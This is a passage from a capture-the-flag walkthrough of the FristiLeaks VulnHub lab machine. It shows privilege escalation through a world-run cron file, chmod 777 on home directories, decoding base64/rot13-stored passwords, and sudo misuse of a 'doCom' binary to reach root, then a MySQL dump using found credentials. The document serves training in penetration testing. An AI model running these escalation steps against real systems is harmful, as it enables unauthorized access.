<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>bash-4.1$ cat notes.txt</div>
    <div>Yo EZ,</div>
    <div>
        <div><br /></div>
    </div>
    <div>I made it possible for you to do some automated checks, </div>
    <div>but I did only allow you access to /usr/bin/* system binaries. I did</div>
    <div>however copy a few extra often needed commands to my </div>
    <div>homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those</div>
    <div>from /home/admin/</div>
    <div>
        <div><br /></div>
    </div>
    <div>Don't forget to specify the full path for each binary!</div>
    <div>
        <div><br /></div>
    </div>
    <div>Just put a file called "runthis" in /tmp/, each line one command. The </div>
    <div>output goes to the file "cronresult" in /tmp/. It should </div>
    <div>run every minute with my account privileges.</div>
    <div>
        <div><br /></div>
    </div>
    <div>- Jerry</div>
</div>
<div><br /></div>
<div>So, if we are reading this correctly, Jerry has set up a cron job to run a file called /tmp/runthis every minute. Apparently he has also put some commands in /home/admin for us to be able to call directly in our 'runthis' file.</div>
<div><br /></div>
<div>Poor Jerry. The first command I'm going to run is to make all the /home directories wide open.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/fristileaks13# cat runthis </div>
    <div>/home/admin/chmod -R 777 /home/*</div>
</div>
<div><br /></div>
<div>I edit the file locally and transfer it to the victim's /tmp directory using python'sÂ SimpleHTTPServer and wget (like above).</div>
<div><br /></div>
<div>Once I see the cron job has run, it's time to go take a look into Jerry's admin folder.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>bash-4.1$ cd /home/admin</div>
    <div>bash-4.1$ ls -F</div>
    <div>cat*Â Â Â Â cronjob.py*Â Â Â Â Â Â Â cryptpass.py*Â Â echo*Â Â Â grep*Â Â whoisyourgodnow.txt</div>
    <div>chmod*Â Â cryptedpass.txt*Â Â df*Â Â Â Â Â Â Â Â Â Â Â Â egrep*Â Â ps*</div>
</div>
<div><br /></div>
<div>There are a couple of interesting TXT files with what appear to be encrypted passwords.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>bash-4.1$ cat cryptedpass.txt</div>
    <div>mVGZ3O3omkJLmy2pcuTq</div>
    <div>bash-4.1$ cat whoisyourgodnow.txt</div>
    <div>=RFn0AKnlMHMPIzpyuTI0ITG</div>
</div>
<div><br /></div>
<div>Not surprisingly, there is also a python script calledÂ cryptpass.py.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>bash-4.1$ cat cryptpass.py</div>
    <div>#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</div>
    <div>import base64,codecs,sys</div>
    <div>
        <div><br /></div>
    </div>
    <div>def encodeString(str):</div>
    <div>Â Â Â Â base64string= base64.b64encode(str)</div>
    <div>Â Â Â Â return codecs.encode(base64string[::-1], 'rot13')</div>
    <div>
        <div><br /></div>
    </div>
    <div>cryptoResult=encodeString(sys.argv[1])</div>
    <div>print cryptoResult</div>
</div>
<div><br /></div>
<div>We should be able to reverse this encryption routine pretty easily. I'd like to test the original out first to see what format the hashes end up in and to make sure my reverse routine is working. I start by recreating cryptpass.py (with some extra print statements) on my attacking machine and test it out.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/fristileaks13# python cryptpass.py testing</div>
    <div>dGVzdGluZw==</div>
    <div>==wZulGdzVGd</div>
    <div>==jMhyTqmITq</div>
</div>
<div><br /></div>
<div>So, the routine takes my string, base64 encodes it, reverses the base64 encoded string, then encodes it again using the 'rot13' codec. (The <a href="https://docs.python.org/2/library/codecs.html" target="_blank">python docs</a> for codecs state that rot13 'Returns the Caesar-cypher encryption of the operand', FYI.)</div>
<div><br /></div>
<div>Now I'll createÂ decryptpass.py, reversing the order of operations (i.e., decode rot13, reverse the string and decode base64).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/fristileaks13# cat decryptpass.py</div>
    <div>import base64,codecs,sys</div>
    <div>
        <div><br /></div>
    </div>
    <div>def decodeString(crypt):</div>
    <div>Â Â Â Â base64string=codecs.decode(crypt, 'rot13')</div>
    <div>Â Â Â Â return base64.b64decode(base64string[::-1])</div>
    <div>
        <div><br /></div>
    </div>
    <div>str=decodeString(sys.argv[1])</div>
    <div>print str</div>
</div>
<div><br /></div>
<div>I testÂ decryptpass.py with the cipher text from my test... and it works.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/fristileaks13# python decryptpass.py ==jMhyTqmITq</div>
    <div>testing</div>
</div>
<div><br /></div>
<div>Time to try the cipher text from Jerry's TXT files. Looking closely at the encrypted strings in the TXT files, we see they don't have the preceding '==' like our test cipher. Let's go ahead and add that when trying to decrypt.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/fristileaks13# python decryptpass.py ==mVGZ3O3omkJLmy2pcuTq</div>
    <div>thisisalsopw123</div>
    <div>root@kali:~/Walkthroughs/fristileaks13# python decryptpass.py ==RFn0AKnlMHMPIzpyuTI0ITG</div>
    <div>LetThereBeFristi!</div>
</div>
<div><br /></div>
<div>Nice! looks like we were able to decrypt both passwords. Now, to test them. We've already taken over Jerry's home directory. Let's try to become 'fristigod'.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>bash-4.1$ su - fristigod</div>
    <div>Password: LetThereBeFristi!</div>
    <div>
        <div><br /></div>
    </div>
    <div>-bash-4.1$ id</div>
    <div>uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)</div>
</div>
<div><br /></div>
<div>There is a /home/fristigod directory, but we remember seeing in /etc/passwd thatÂ fristigod's home directory is actuallyÂ /var/fristigod (that interesting directory from earlier).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>-bash-4.1$ grep `whoami` /etc/passwd</div>
    <div>fristigod:x:502:502::/var/fristigod:/bin/bash</div>
</div>
<div><br /></div>
<div>Let's go check it out...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>-bash-4.1$ cd /var/fristigod</div>
    <div>-bash-4.1$ ls -a</div>
    <div>.Â Â ..Â Â .bash_historyÂ Â .secret_admin_stuff</div>
</div>
<div><br /></div>
<div>The hidden '.secret_admin_stuff' directory is obviously going to be juicy, but let's check out the .bash_history file first to see whatÂ fristigod has been up to.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>-bash-4.1$ cat .bash_history</div>
    <div>cat .bash_history</div>
    <div>ls</div>
    <div>pwd</div>
    <div>ls -lah</div>
    <div>cd .secret_admin_stuff/</div>
    <div>ls</div>
    <div>./doCom </div>
    <div>./doCom test</div>
    <div>sudo ls</div>
    <div>exit</div>
    <div>cd .secret_admin_stuff/</div>
    <div>ls</div>
    <div>./doCom </div>
    <div>sudo -u fristi ./doCom ls /</div>
    <div>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</div>
    <div>exit</div>
    <div>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</div>
    <div>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div>
    <div>exit</div>
    <div>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div>
    <div>exit</div>
    <div>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div>
    <div>sudo /var/fristigod/.secret_admin_stuff/doCom</div>
    <div>exit</div>
    <div>sudo /var/fristigod/.secret_admin_stuff/doCom</div>
    <div>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div>
    <div>exit</div>
    <div>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div>
    <div>exit</div>
    <div>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div>
    <div>groups</div>
    <div>ls -lah</div>
    <div>usermod -G fristigod fristi</div>
    <div>exit</div>
    <div>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div>
    <div>less /var/log/secure e</div>
    <div>Fexit</div>
    <div>exit</div>
    <div>exit</div>
</div>
<div><br /></div>
<div>Looks like they like to use the 'doCom' command. Looks like they can also run it with 'sudo', which is nice. Let's take a page out of their book and try to 'doCom' /bin/bash.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</div>
    <div>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</div>
    <div>[sudo] password for fristigod: LetThereBeFristi!</div>
    <div>
        <div><br /></div>
    </div>
    <div>bash-4.1# id</div>
    <div>id</div>
    <div>uid=0(root) gid=100(users) groups=100(users),502(fristigod)</div>
</div>
<div><br /></div>
<div>Hello, r00t!</div>
<div><br /></div>
<div>Let's go check out /root</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>bash-4.1# cd /root</div>
    <div>bash-4.1# ls</div>
    <div>ls</div>
    <div>fristileaks_secrets.txt</div>
    <div>bash-4.1# cat fristileaks_secrets.txt</div>
    <div>cat fristileaks_secrets.txt</div>
    <div>Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]</div>
    <div>
        <div><br /></div>
    </div>
    <div>I wonder if you beat it in the maximum 4 hours it's supposed to take!</div>
    <div>
        <div><br /></div>
    </div>
    <div>Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>Flag: Y0u_kn0w_y0u_l0ve_fr1st1</div>
    <div>
        <div><br /></div>
    </div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Pivoting</h2>
</div>
<div>N/A</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Clean Up</h2>
</div>
<div><br /></div>
<div>*** REMOVEÂ /var/www/html/fristi/uploads/rev.php.png ***</div>
<div>*** STOPÂ /var/www/html/fristi/uploads/thumbs ***</div>
<div>*** REMOVEÂ /var/www/html/fristi/uploads/thumbs ***</div>
<div>*** REMOVE /tmp/runthis ***</div>
<div>*** REMOVE /tmp/cronresult ***</div>
<div>*** FIX PERMISSIONS /home/admin ***</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Additional Info</h2>
</div>
<div><br /></div>
<div><span style="font-weight: bold;">'hackmenow' Database</span></div>
<div><br /></div>
<div>After gaining root, I decided to go back and check out those db credentials we found inÂ /var/www/html/fristi/checklogin.php. Unfortunately, theÂ eezeepz was the only user in the members database. There aren't any other tables or databases to look at.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>bash-4.1# mysql -u eezeepz -p -h localhost hackmenow</div>
    <div>mysql -u eezeepz -p -h localhost hackmenow</div>
    <div>Enter password: 4ll3maal12#</div>
    <div>
        <div><br /></div>
    </div>
    <div>Reading table information for completion of table and column names</div>
    <div>You can turn off this feature to get a quicker startup with -A</div>
    <div>
        <div><br /></div>
    </div>
    <div>Welcome to the MySQL monitor.Â Â Commands end with ; or \g.</div>
    <div>Your MySQL connection id is 51930</div>
    <div>Server version: 5.1.73 Source distribution</div>
    <div>
        <div><br /></div>
    </div>
    <div>Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.</div>
    <div>
        <div><br /></div>
    </div>
    <div>Oracle is a registered trademark of Oracle Corporation and/or its</div>
    <div>affiliates. Other names may be trademarks of their respective</div>
    <div>owners.</div>
    <div>
        <div><br /></div>
    </div>
    <div>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</div>
    <div>
        <div><br /></div>
    </div>
    <div>mysql&gt; show tables;</div>
    <div>+---------------------+</div>
    <div>| Tables_in_hackmenow |</div>
    <div>+---------------------+</div>
    <div>| membersÂ Â Â Â Â Â Â Â Â Â Â Â Â |</div>
    <div>+---------------------+</div>
    <div>1 row in set (0.00 sec)</div>
    <div><br /></div>
    <div>mysql&gt; select * from members;</div>
    <div>+----+----------+--------------------+</div>
    <div>| id | username | passwordÂ Â Â Â Â Â Â Â Â Â Â |</div>
    <div>+----+----------+--------------------+</div>
    <div>|Â Â 1 | eezeepzÂ Â | keKkeKKeKKeKkEkkEk |</div>
    <div>+----+----------+--------------------+</div>
    <div>1 row in set (0.00 sec)</div>
    <div><br /></div>
    <div>
        <div>mysql&gt; show databases;</div>
        <div>+--------------------+</div>
        <div>| DatabaseÂ Â Â Â Â Â Â Â Â Â Â |</div>
        <div>+--------------------+</div>
        <div>| information_schema |</div>
        <div>| hackmenowÂ Â Â Â Â Â Â Â Â Â |</div>
        <div>+--------------------+</div>
        <div>
            <div>2 rows in set (0.00 sec)</div>
            <div><br /></div>
        </div>
        <div>mysql&gt; </div>
    </div>
</div>
<div><br /></div>
<div><br /></div>